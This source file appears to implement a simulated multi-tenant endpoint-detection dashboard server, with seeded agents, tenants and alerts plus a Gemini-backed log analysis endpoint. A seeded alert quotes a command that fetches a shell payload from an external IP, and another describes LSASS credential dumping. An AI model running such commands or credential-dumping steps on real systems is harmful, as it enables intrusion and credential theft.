import express from 'express';
import path from 'path';
import { createServer as createViteServer } from 'vite';
import { GoogleGenAI } from '@google/genai';

// Initialize Express
const app = express();
app.use(express.json());

const PORT = 3000;

// Lazy initialize Gemini API client
let aiInstance: GoogleGenAI | null = null;
function getGeminiClient(): GoogleGenAI {
  if (!aiInstance) {
    const apiKey = process.env.GEMINI_API_KEY;
    if (!apiKey || apiKey === 'MY_GEMINI_API_KEY' || apiKey.trim() === '') {
      throw new Error('GEMINI_API_KEY environment variable is missing or unconfigured. Please configure it in Settings -> Secrets.');
    }
    aiInstance = new GoogleGenAI({
      apiKey: apiKey,
      httpOptions: {
        headers: {
          'User-Agent': 'aistudio-build'
        }
      }
    });
  }
  return aiInstance;
}

// In-Memory Database State representing deep multi-tenant network registries
interface Agent {
  id: string;
  tenant_id: string;
  hostname: string;
  ip_address: string;
  os_family: 'Windows' | 'Linux';
  os_kernel_version: string;
  agent_version: string;
  connection_status: 'Online' | 'Offline' | 'Unresponsive' | 'Compromised';
  mtls_cert_serial: string;
  last_heartbeat: string;
  cpu_usage: number;
  memory_usage: number;
  active_processes: { pid: number; ppid: number; name: string; path: string; cpu: number; memory: number }[];
  network_connections: { proto: 'TCP' | 'UDP'; local: string; remote: string; state: string }[];
}

interface Alert {
  id: string;
  tenant_id: string;
  agent_id: string;
  hostname: string;
  severity: 'Mild' | 'Moderate' | 'Severe' | 'Critical';
  mitre_tactic: string;
  mitre_technique: string;
  detection_mechanism: string;
  title: string;
  description: string;
  status: 'New' | 'Triage' | 'In_Progress' | 'Resolved' | 'Suppressed';
  remediation_action?: string;
  created_at: string;
}

interface Tenant {
  id: string;
  name: string;
  tier: 'Standard' | 'Enterprise' | 'FedRAMP-High';
  encryption_key_arn: string;
  created_at: string;
}

// Seed Initial Multi-tenant Data
let tenants: Tenant[] = [
  {
    id: '426be23d-2bf0-4b9a-bbce-144cfab89e01',
    name: 'Acme Cyber Sec Corp',
    tier: 'Enterprise',
    encryption_key_arn: 'arn:aws:kms:us-east-1:123456789012:key/a283b9c0-acbe-41fa',
    created_at: new Date(Date.now() - 30 * 24 * 3600 * 1000).toISOString()
  },
  {
    id: '912be54f-bc9c-493a-8b1b-aa31bab2208c',
    name: 'Vanguard Mil-Spec Corp',
    tier: 'FedRAMP-High',
    encryption_key_arn: 'arn:aws:kms:us-gov-west-1:999811223401:key/f918bca2-81bb-45ea',
    created_at: new Date(Date.now() - 60 * 24 * 3600 * 1000).toISOString()
  }
];

let agents: Agent[] = [
  {
    id: 'ce51a84f-fc7c-48be-8065-27a1a09dbe9c',
    tenant_id: '426be23d-2bf0-4b9a-bbce-144cfab89e01',
    hostname: 'PROD-SYS-SQL03',
    ip_address: '10.140.24.81',
    os_family: 'Linux',
    os_kernel_version: 'Linux 6.1.0-9-amd64',
    agent_version: 'v1.4.2',
    connection_status: 'Online',
    mtls_cert_serial: '0x9EBA34CE51F8065',
    last_heartbeat: new Date().toISOString(),
    cpu_usage: 12.4,
    memory_usage: 64.2,
    active_processes: [
      { pid: 1, ppid: 0, name: 'systemd', path: '/sbin/init', cpu: 0.1, memory: 1.2 },
      { pid: 10421, ppid: 1, name: 'curl', path: '/usr/bin/curl', cpu: 45.2, memory: 5.6 },
      { pid: 3044, ppid: 1, name: 'postgresql', path: '/usr/lib/postgresql/bin/postgres', cpu: 2.1, memory: 15.4 },
      { pid: 2115, ppid: 1, name: 'nginx', path: '/usr/sbin/nginx', cpu: 1.2, memory: 4.5 }
    ],
    network_connections: [
      { proto: 'TCP', local: '10.140.24.81:5432', remote: '10.140.24.12:49210', state: 'ESTABLISHED' },
      { proto: 'TCP', local: '10.140.24.81:80', remote: '185.120.30.22:443', state: 'ESTABLISHED' },
      { proto: 'TCP', local: '10.140.24.81:443', remote: '0.0.0.0:0', state: 'LISTEN' }
    ]
  },
  {
    id: 'ab21e34c-1fc2-48df-9221-df192bc0d821',
    tenant_id: '426be23d-2bf0-4b9a-bbce-144cfab89e01',
    hostname: 'CORP-WIN-WORK12',
    ip_address: '192.168.1.105',
    os_family: 'Windows',
    os_kernel_version: 'NT 10.0.22631 (Win11 Pro)',
    agent_version: 'v1.4.2',
    connection_status: 'Online',
    mtls_cert_serial: '0x33BC1A22DF192B0',
    last_heartbeat: new Date().toISOString(),
    cpu_usage: 28.1,
    memory_usage: 41.8,
    active_processes: [
      { pid: 4, ppid: 0, name: 'System', path: 'C:\\Windows\\System32\\System', cpu: 1.1, memory: 0.5 },
      { pid: 4322, ppid: 4, name: 'powershell.exe', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cpu: 15.4, memory: 14.2 },
      { pid: 812, ppid: 4, name: 'explorer.exe', path: 'C:\\Windows\\explorer.exe', cpu: 4.2, memory: 8.1 },
      { pid: 1102, ppid: 4, name: 'lsass.exe', path: 'C:\\Windows\\System32\\lsass.exe', cpu: 32.5, memory: 22.4 }
    ],
    network_connections: [
      { proto: 'TCP', local: '192.168.1.105:49221', remote: '104.244.42.1:443', state: 'ESTABLISHED' },
      { proto: 'TCP', local: '192.168.1.105:139', remote: '0.0.0.0:0', state: 'LISTEN' }
    ]
  },
  {
    id: 'f931bc10-ef2b-478a-bb0a-f0ca3deba201',
    tenant_id: '912be54f-bc9c-493a-8b1b-aa31bab2208c',
    hostname: 'GOV-KUBE-NODE01',
    ip_address: '10. Government.SecureNet',
    os_family: 'Linux',
    os_kernel_version: 'Linux 6.5.0-vanguard-hardened',
    agent_version: 'v1.5.0-FIPS',
    connection_status: 'Online',
    mtls_cert_serial: '0xF0CA3DEBA20101FA',
    last_heartbeat: new Date().toISOString(),
    cpu_usage: 6.2,
    memory_usage: 81.5,
    active_processes: [
      { pid: 1, ppid: 0, name: 'systemd', path: '/sbin/init', cpu: 0.1, memory: 1.0 },
      { pid: 994, ppid: 1, name: 'kubelet', path: '/usr/bin/kubelet', cpu: 4.1, memory: 15.4 },
      { pid: 1204, ppid: 1, name: 'etcd', path: '/usr/bin/etcd', cpu: 2.1, memory: 25.1 }
    ],
    network_connections: [
      { proto: 'TCP', local: '10.100.0.5:2379', remote: '10.100.0.6:49112', state: 'ESTABLISHED' }
    ]
  }
];

let alerts: Alert[] = [
  {
    id: 'fe9310ca-cfb2-4db1-9c88-e9f0be2413fa',
    tenant_id: '426be23d-2bf0-4b9a-bbce-144cfab89e01',
    agent_id: 'ce51a84f-fc7c-48be-8065-27a1a09dbe9c',
    hostname: 'PROD-SYS-SQL03',
    severity: 'Critical',
    mitre_tactic: 'TA0011 - Command and Control',
    mitre_technique: 'T1105 - Ingress Tool Transfer',
    detection_mechanism: 'eBPF_Anomaly_Heuristic',
    title: 'Suspicious External Tool Ingress Detected',
    description: 'The binary /usr/bin/curl was spawned as root user and attempted execution with terminal payload redirection redirecting to shell ingestion script (curl -s http://185.120.30.22/payload.sh).',
    status: 'New',
    created_at: new Date(Date.now() - 3600 * 1000).toISOString()
  },
  {
    id: 'bca9810a0-dbeb-41f2-9c31-f92bc31a02b1',
    tenant_id: '426be23d-2bf0-4b9a-bbce-144cfab89e01',
    agent_id: 'ab21e34c-1fc2-48df-9221-df192bc0d821',
    hostname: 'CORP-WIN-WORK12',
    severity: 'Severe',
    mitre_tactic: 'TA0006 - Credential Access',
    mitre_technique: 'T1003.001 - LSASS Memory Dumping',
    detection_mechanism: 'ETW_Heuristic_Engine',
    title: 'Process Memory Access on LSASS.EXE',
    description: 'An atypical memory access request with full read privileges (0x0F10) was requested on LSASS.EXE by process powershell.exe (PID 4322). This is standard indicators of credential harvesting attacks (e.g. Mimikatz).',
    status: 'In_Progress',
    created_at: new Date(Date.now() - 7200 * 1000).toISOString()
  }
];

// --- 1. CORE API ROUTES ---

// Ingest custom manual alerts or telemetry
app.post('/api/v1/telemetry/ingest', (req, res) => {
  const { agent_id, events } = req.body;
  const agent = agents.find(a => a.id === agent_id);
  if (!agent) {
    return res.status(404).json({ error: 'Agent profile not recognized' });
  }
  
  agent.last_heartbeat = new Date().toISOString();
  agent.connection_status = 'Online';

  // Process incoming events and auto-flag risk scores > 0.8
  let actionRequired = false;
  if (events && Array.isArray(events)) {
    events.forEach(evt => {
      if (evt.risk_score && evt.risk_score > 0.8 || (evt.cmdline && evt.cmdline.includes('curl'))) {
        actionRequired = true;
        // create alert dynamically
        const newAlert: Alert = {
          id: `uuid-${Math.random().toString(36).substr(2, 9)}`,
          tenant_id: agent.tenant_id,
          agent_id: agent.id,
          hostname: agent.hostname,
          severity: 'Critical',
          mitre_tactic: 'TA0011 - Command and Control',
          mitre_technique: 'T1105 - Ingress Tool Transfer',
          detection_mechanism: 'mTLS_Realtime_Ingest_Engine',
          title: 'Immediate Telemetry Hazard Trigger',
          description: `Ingested high risk telemetry event payload: "${evt.cmdline || evt.bin_path || 'Suspicious Process activity'}"`,
          status: 'New',
          created_at: new Date().toISOString()
        };
        alerts.unshift(newAlert);
      }
    });
  }

  res.json({
    status: 'ack',
    processed_events: events ? events.length : 0,
    action_required: actionRequired,
    timestamp: new Date().toISOString()
  });
});

// GET list of active monitoring endpoints
app.get('/api/v1/agents', (req, res) => {
  res.json(agents);
});

// Update specific agent status (quarantine, configure, etc)
app.post('/api/v1/agents/:id/quarantine', (req, res) => {
  const agent = agents.find(a => a.id === req.params.id);
  if (!agent) return res.status(404).json({ error: 'Agent node not found' });
  
  agent.connection_status = 'Compromised'; // Representing quarantined active isolation mode
  agent.cpu_usage = 0.5;
  agent.memory_usage = 2.0;
  agent.active_processes = [{ pid: 1, ppid: 0, name: 'systemd', path: '/sbin/init', cpu: 0, memory: 0.1 }];
  agent.network_connections = [{ proto: 'TCP', local: '127.0.0.1:0', remote: '0.0.0.0:0', state: 'ISOLATED' }];

  // Audit trial insertion
  const systemAdminId = 'e9314c1d-114c-473d-862d-02ba2cb68b5a';
  console.log(`[AUDIT] USER ${systemAdminId} QUARANTINED agent hostname: ${agent.hostname}`);

  res.json({ message: `Agent ${agent.hostname} isolated and quarantined with zero external networks.`, agent });
});

// Kill target PID on agent
app.post('/api/v1/agents/:id/kill-process', (req, res) => {
  const { pid } = req.body;
  const agent = agents.find(a => a.id === req.params.id);
  if (!agent) return res.status(404).json({ error: 'Agent node not found' });

  const initialCount = agent.active_processes.length;
  agent.active_processes = agent.active_processes.filter(p => p.pid !== Number(pid));
  
  if (agent.active_processes.length === initialCount) {
    return res.status(400).json({ error: `PID ${pid} is not active on host.` });
  }

  res.json({ message: `SIGKILL dispatched. Process PID ${pid} terminated on ${agent.hostname}.`, agent });
});

// Bootstrapping new Agent registration
app.post('/api/v1/agents/register', (req, res) => {
  const { hostname, ip_address, platform, os_kernel, agent_version } = req.body;
  
  const newAgent: Agent = {
    id: `ce-${Math.random().toString(36).substr(2, 9)}-48be-8065-27a1`,
    tenant_id: '426be23d-2bf0-4b9a-bbce-144cfab89e01',
    hostname: hostname || 'SEC-NODE-AUTO',
    ip_address: ip_address || '10.0.5.21',
    os_family: platform === 'Windows' ? 'Windows' : 'Linux',
    os_kernel_version: os_kernel || 'Linux 6.1.0-9-generic',
    agent_version: agent_version || 'v1.4.2',
    connection_status: 'Online',
    mtls_cert_serial: `0x${Math.floor(Math.random() * 1000000000).toString(16).toUpperCase()}`,
    last_heartbeat: new Date().toISOString(),
    cpu_usage: 1.5,
    memory_usage: 4.5,
    active_processes: [
      { pid: 1, ppid: 0, name: 'systemd', path: '/sbin/init', cpu: 0.1, memory: 0.5 },
      { pid: 102, ppid: 1, name: 'agent-daemon', path: '/usr/local/bin/agent', cpu: 0.8, memory: 2.1 }
    ],
    network_connections: [
      { proto: 'TCP', local: `${ip_address || '10.0.5.21'}:49150`, remote: '10.140.24.81:443', state: 'ESTABLISHED' }
    ]
  };

  agents.push(newAgent);
  res.json({
    agent_id: newAgent.id,
    mTLS_issued_cert: "-----BEGIN CERTIFICATE-----\nMIIEDzCCAvegAwIBAgIUdTd72aBvV7f3964H1o4A6XpE6MswDQYJKoZIhvcNAQEL\n...",
    ca_chain: "-----BEGIN CERTIFICATE-----\n...",
    heartbeat_interval_seconds: 15,
    remediation_channel: `ws://ingress.cyberguard.net/api/v1/ws/agents/${newAgent.id}`
  });
});

// GET all incident threat alerts
app.get('/api/v1/alerts', (req, res) => {
  res.json({
    items: alerts,
    total: alerts.length,
    pages: 1,
    current_page: 1
  });
});

// Remediate and solve security threat alerts
app.post('/api/v1/alerts/:alert_id/remediate', (req, res) => {
  const alert = alerts.find(a => a.id === req.params.alert_id);
  if (!alert) return res.status(404).json({ error: 'Incident reference not found' });
  
  const { action, reason } = req.body;
  alert.status = 'Resolved';
  alert.remediation_action = `${action || 'QUARANTINE_NODE'} triggered. Reason: ${reason}`;

  // If the action is quarantine, perform the quarantine action on the target agent as well!
  if (action === 'QUARANTINE_NODE') {
    const targetAgent = agents.find(a => a.id === alert.agent_id);
    if (targetAgent) {
      targetAgent.connection_status = 'Compromised';
      targetAgent.active_processes = [{ pid: 1, ppid: 0, name: 'systemd', path: '/sbin/init', cpu: 0, memory: 0.1 }];
      targetAgent.network_connections = [{ proto: 'TCP', local: '127.0.0.1:0', remote: '0.0.0.0:0', state: 'ISOLATED' }];
    }
  }

  res.json({
    incident_tracking_id: `inc_${Math.random().toString(36).substr(2, 12)}`,
    agent_id: alert.agent_id,
    status: 'PLAYBOOK_DISPATCHED',
    timestamp: new Date().toISOString()
  });
});

// Multi-tenant configuration routes
app.get('/api/v1/tenants', (req, res) => {
  res.json(tenants);
});

app.post('/api/v1/tenants', (req, res) => {
  const { name, tier, encryption_key_arn } = req.body;
  if (!name) return res.status(400).json({ error: 'Company Name is vital input.' });
  
  const newTenant: Tenant = {
    id: `tenant-${Math.random().toString(36).substr(2, 9)}-4b9a-bbce`,
    name,
    tier: tier || 'Standard',
    encryption_key_arn: encryption_key_arn || `arn:aws:kms:us-east-1:123456789012:key/${Math.random().toString(36).substr(2, 9)}`,
    created_at: new Date().toISOString()
  };
  
  tenants.push(newTenant);
  res.json(newTenant);
});

// Prom scraper configuration simulation endpoint 
app.get('/api/v1/metrics', (req, res) => {
  res.setHeader('Content-Type', 'text/plain; version=0.0.4');
  const onlineCount = agents.filter(a => a.connection_status === 'Online').length;
  const compromisedCount = agents.filter(a => a.connection_status === 'Compromised').length;
  
  res.send(`# HELP cyberguard_agent_heartbeat_miss_count Number of critical offline endpoints.
# TYPE cyberguard_agent_heartbeat_miss_count counter
cyberguard_agent_heartbeat_miss_count ${agents.length - onlineCount - compromisedCount}

# HELP cyberguard_telemetry_events_ingested_total Accumulative telemetry event parcels processed.
# TYPE cyberguard_telemetry_events_ingested_total counter
cyberguard_telemetry_events_ingested_total ${1041042 + (alerts.length * 12)}

# HELP cyberguard_compromised_agent_count Alerts indicating system isolation.
# TYPE cyberguard_compromised_agent_count gauge
cyberguard_compromised_agent_count ${compromisedCount}
`);
});

// --- 2. INTERACTIVE SERVER SIDE GEMINI SECURITY ADVISOR CODES ---
app.post('/api/v1/ai/analyze', async (req, res) => {
  const { rawText } = req.body;
  
  if (!rawText || rawText.trim() === '') {
    return res.status(400).json({ error: 'Empty log entry received. Please feed some telemetry data.' });
  }

  try {
    const aiClient = getGeminiClient();
    const cleanPrompt = `You are a Senior Principal Incident Response Specialist and cyber forensic researcher investigating raw event logs.
Analyze the following telemetry or process output. Detect if there are indicators of adversarial behavior, MITRE ATT&CK techniques, high risk abnormalities, or normal background workflows:

RAW LOG CONTEXT:
"""
${rawText}
"""

Please formulate your response strictly in the following JSON format. Make it highly technical and diagnostic.
Do not wrap your response in markdown markers other than returning raw parsing compatible string:
{
  "severity": "Mild" | "Moderate" | "Severe" | "Critical",
  "mitreTactic": "Tactic description (e.g. TA0003 - Persistence)",
  "mitreTechnique": "Technique (e.g. T1547 - Boot/Logon Autostart)",
  "detectionMechanism": "Heuristic mechanism mapped",
  "remediation": "Concise step-by-step shell commands, system changes, or defensive actions",
  "explanation": "Markdown description identifying the vulnerability, forensic indicators, and binary footprints seen."
}`;

    const response = await aiClient.models.generateContent({
      model: 'gemini-3.5-flash',
      contents: cleanPrompt,
      config: {
        responseMimeType: 'application/json'
      }
    });

    const resultText = response.text;
    res.setHeader('Content-Type', 'application/json');
    res.send(resultText);

  } catch (error: any) {
    console.error('Gemini API Error:', error);
    res.status(500).json({ 
      error: error.message || 'The Gemini AI analysis failed. Please verify your GEMINI_API_KEY parameters in your local workspace settings panel.'
    });
  }
});


// --- 3. EXPOSE VITE MIDDLEWARE DEVELOPMENT / PRODUCTION ROUTE INGRESS ---
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`[CYBER-GUARD-SERVER] Full-Stack Secure API Server executing on http://0.0.0.0:${PORT}`);
  });
}

startServer();
